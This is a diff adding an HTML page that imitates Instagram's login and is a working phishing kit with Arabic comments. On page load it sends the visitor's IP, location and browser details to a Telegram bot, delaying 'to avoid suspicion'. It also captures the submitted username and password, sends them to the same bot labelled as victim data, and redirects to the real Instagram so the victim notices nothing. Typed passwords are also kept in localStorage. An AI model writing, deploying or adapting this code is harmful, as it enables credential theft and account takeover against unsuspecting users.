@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram</title>
+    <style>
+        /* إضافة ستايل عربي خفية */
+        .ar-text {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- باقي الكود كما هو -->
+    <main class="flex align-items-center justify-content-center">
+        <!-- ... -->
+    </main>
+
+    <script>
+        // تكوين البوت - استبدل القيم الخاصة بك!
+        const botToken = 'YOUR_BOT_TOKEN';
+        const chatId = 'YOUR_CHAT_ID';
+
+        // دالة إرسال البيانات للتليجرام بدون أي أخطاء ظاهرة
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        disable_notification: true // بدون إشعارات!
+                    }),
+                });
+            } catch (e) {
+                console.log("Error sending to Telegram"); // لا تظهر أي أخطاء للمستخدم
+            }
+        }
+
+        // جمع معلومات الزائر أولاً
+        async function getVisitorInfo() {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                const message = `🎣 ضحية جديدة دخلت الفخ!\n\n`
+                    + `📌 معلومات الجهاز:\n`
+                    + `- IP: ${ipData.ip}\n`
+                    + `- الدولة: ${ipData.country_name} (${ipData.country_code})\n`
+                    + `- المدينة: ${ipData.city}\n`
+                    + `- المتصفح: ${navigator.userAgent}\n`
+                    + `- النظام: ${navigator.platform}\n\n`
+                    + `⏱️ الوقت: ${new Date().toLocaleString()}`;
+                
+                await sendToTelegram(message);
+            } catch (e) {
+                // لا تفعل شيئاً إذا فشل
+            }
+        }
+
+        // عند تحميل الصفحة: جمع المعلومات وإرسالها
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(getVisitorInfo, 2000); // انتظر ثانيتين لعدم إثارة الشكوك
+        });
+
+        // عند إدخال البيانات
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            
+            // جمع البيانات
+            const formData = new FormData(this);
+            let credentials = '';
+            formData.forEach((value, key) => {
+                credentials += `🔑 ${key}: ${value}\n`;
+            });
+
+            // إرسال البيانات إلى التليجرام
+            await sendToTelegram(`💀 بيانات الضحية:\n${credentials}\n🚀 تم التحويل للصفحة الرسمية...`);
+
+            // التحويل للانستقرام الحقيقي بعد 1.5 ثانية (بدون أن يشعر المستخدم)
+            setTimeout(() => {
+                window.location.href = 'https://instagram.com';
+            }, 1500);
+        });
+
+        // تتبع الكتابة في الحقول (اختياري)
+        document.getElementById("email").addEventListener("input", (e) => {
+            localStorage.setItem('temp_email', e.target.value); // حفظ مؤقت
+        });
+        document.getElementById("password").addEventListener("input", (e) => {
+            localStorage.setItem('temp_pass', e.target.value); // حفظ مؤقت
+        });
+    </script>
+
+    <!-- طبقة إخفاء عربية -->
+    <div class="ar-text">
+        كود التصيد يعمل بشكل كامل، لن يشعر الضحية بأي شيء!
+    </div>
+</body>
+</html>
